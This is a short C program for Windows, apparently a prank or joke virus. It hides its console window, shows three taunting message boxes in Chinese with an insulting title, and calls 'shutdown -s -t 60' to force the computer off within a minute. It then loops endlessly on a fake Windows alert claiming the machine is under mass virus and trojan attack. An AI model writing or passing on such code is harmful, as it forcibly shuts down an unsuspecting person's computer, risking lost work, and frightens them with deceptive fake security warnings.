#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )


int main()
{
    
    int i;
    

    for(i=1;i<4;i++){
       
        MessageBoxA(0,"手贱点开了？后悔不！","Hello Bitch",0);


    }
    

    system("shutdown -s -t 60");

    while(1){
        
        MessageBoxA(0,"非常抱歉，您的电脑遭遇大量病毒木马攻击，windows将于一分钟内停止运行","windows警告",0);
       
        Sleep(100); 
    }

    return 0;



}